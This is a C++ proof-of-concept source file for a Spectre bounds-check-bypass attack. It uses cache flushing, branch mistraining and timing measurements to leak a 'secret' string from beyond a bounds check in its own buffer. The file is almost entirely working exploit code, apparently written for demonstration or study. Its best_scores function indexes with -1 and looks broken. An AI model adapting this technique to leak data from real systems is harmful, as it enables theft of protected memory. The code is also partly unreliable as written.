#include <array>
#include <cassert>
#include <chrono>
#include <cstring>
#include <exception>
#include <iostream>
#include <memory>
#include <numeric>
#include <vector>
#include <x86intrin.h>

using std::chrono::duration_cast;
using std::chrono::nanoseconds;
using std::chrono::high_resolution_clock;

void access_memory(const void* p) {
    __asm__ __volatile__ ("" : :
                          "r"(*static_cast<const uint8_t*>(p)) : "memory");
}

/// @brief Gets current time in nanoseconds.
/// @return Time in nanoseconds.
auto get_time() {
    return duration_cast<nanoseconds>(high_resolution_clock::now().time_since_epoch()).count();
}

template <class ContainerType>
concept Container = requires(ContainerType a, const ContainerType b)
{
    requires std::regular<ContainerType>;
    requires std::swappable<ContainerType>;
    requires std::destructible<typename ContainerType::value_type>;
    requires std::same_as<typename ContainerType::reference, typename ContainerType::value_type &>;
    requires std::same_as<typename ContainerType::const_reference, const typename ContainerType::value_type &>;
    requires std::forward_iterator<typename ContainerType::iterator>;
    requires std::forward_iterator<typename ContainerType::const_iterator>;
    requires std::signed_integral<typename ContainerType::difference_type>;
    requires std::same_as<typename ContainerType::difference_type, typename std::iterator_traits<typename
                                                                                                 ContainerType::iterator>::difference_type>;
    requires std::same_as<typename ContainerType::difference_type, typename std::iterator_traits<typename
                                                                                                 ContainerType::const_iterator>::difference_type>;
};

/// @brief Take an average value of all container elements.
/// @param container with elements for average calculation.
/// @param skip_index is index to be skipped from average value calculation.
auto average(const Container auto& container, const std::size_t skip_index) -> double
{
    double sum = 0.0;
    for (auto idx = 0U; idx != container.size(); ++idx)
    {
        if (skip_index != idx)
        {
            sum += container.at(idx);
        }
    }
    return sum/container.size();
}

/// @brief Assign score to latencies according to theirs values.
/// @details This function detects which values from latencies have values below some set threshold and increase score
/// at the same index in scores container.
/// @param latencies stores latencies
/// @param scores stores scores of latencies. Value of latency in latencies correspond to score value in scores.
/// @param ok_index is to be ignored. This latency will be false positive since it's hot in cache.
auto score_latencies(const Container auto& latencies, Container auto& scores, size_t ok_index)
{
    assert(latencies.size() == scores.size());

    // Average latency of all values in "latencies" container (skipped "ok_index")
    const double average_latency = average(latencies, ok_index);
    constexpr const double latency_threshold_coefficient = 0.5;
    for (auto idx = 0U; idx != latencies.size(); ++idx)
    {
        // Skip  "ok_index" because we know it will have good score. It's hot in cache.
        bool not_skip_index = ok_index != idx;

        // Threshold value below which latency will score point.
        const auto latency_threshold = average_latency * latency_threshold_coefficient;
        bool low_enough_latency = latencies.at(idx) < latency_threshold;
        if (not_skip_index && low_enough_latency)
        {
            ++scores[idx];
        }
    }
}

auto best_scores(const Container auto& scores) -> std::pair<size_t, size_t>
{
    auto i1 = -1, i2 = -1;
    for (auto idx = 0; idx != scores.size(); ++idx ) {
        if (scores.at(idx) > scores.at(i1)) {
            i2 = i1;
            i1 = idx;
        } else if ( idx != i1 && scores[ idx ] > scores[i2]) {
            i2 = idx;
        }
    }
    return { i1, i2 };
}

/// @brief Spectre attack function
/// @param data is pointer to begin of combined of "accessible" and "secret" data.
/// @param size is length of valid string from "accessible" memory block.
/// @param evil_index is byte index where "data" is treated as begin of byte array.
/// @return Byte from (data + evil_index).
char spectre_attack(const char* data, std::size_t size, std::size_t evil_index)
{
    constexpr const std::size_t num_val = 256;                      // Number of Timing Elements (size might be due to fact that we're reading by one byte)
    constexpr const std::size_t timing_element_size = 1024;
    struct TimingElement { char s[timing_element_size]; };          // 1KB
    static TimingElement timing_array[num_val];                     // 256KB = 256 * Timing Element
    ::memset(timing_array, 1, sizeof(timing_array));

    // Store Latencies of each Timing Element
    std::array<long, num_val> latencies = {};
    // Store Scores of each Timing Element
    std::array<int, num_val> scores = {};

    std::size_t i1 = 0, i2 = 0;             // Two highest scores
    std::unique_ptr<size_t> data_size(new std::size_t(size));

    constexpr const std::size_t n_iter = 1000;
    for (std::size_t i_iter = 0; i_iter < n_iter; ++i_iter) {

        // Clear cache
        for (std::size_t i = 0; i < num_val; ++i) {
            _mm_clflush(timing_array + i);
        }

        const std::size_t ok_index = i_iter % size;
        constexpr const size_t n_read = 100;
        for (std::size_t i_read = 0; i_read < n_read; ++i_read) {
            _mm_clflush(&*data_size);
            for (volatile int z = 0; z < 1000; ++z) {} // Delay
            const std::size_t i = (i_read & 0xf) ? ok_index : evil_index;
            if (i < *data_size) {
                access_memory(timing_array + data[i]);
            }
        }

        for (std::size_t i = 0; i < num_val; ++i) {
            const std::size_t i_rand = (i*167 + 13) & 0xff; // Randomized
            const TimingElement* const p = timing_array + i_rand;
            const long t0 = get_time();
            access_memory(p);
            latencies[i_rand] = get_time() - t0;
        }

        score_latencies(latencies, scores, ok_index);
        std::tie(i1, i2) = best_scores(scores);
        constexpr const int threshold1 = 2, threshold2 = 100;
        if (scores[i1] > scores[i2]*threshold1 + threshold2)
        {
            return i1;
        }
    }
    return i2;
}

auto main() -> int {
    // Size of data array.
    constexpr const std::size_t memory_block_size = 4096;
    // Allocate array of double size to pretend like second part is not accessible.
    std::vector<char> data(2 * memory_block_size );

    // Fill first part of array with data that should be accessible for application.
    std::string_view accessible_data = "Innocuous data";
    auto accessible_memory_block_begin = data.begin();
    std::ranges::copy( accessible_data, accessible_memory_block_begin);

    // Second part of array contains secret and should not be accessible from application.
    std::string_view secret_data = "Top-secret information";
    auto secret_memory_block_begin = data.begin() + memory_block_size;
    std::ranges::copy(secret_data, secret_memory_block_begin);

    // Looping for each byte in "accessible" memory block
    for (size_t byte_index = 0; byte_index < memory_block_size; ++byte_index) {
        const char c = spectre_attack(data.data(), strlen(data.data()) + 1, memory_block_size + byte_index);
        std::cout << c << std::flush;
        if(!c) break;
    }
    std::cout << std::endl;
    return 0;
}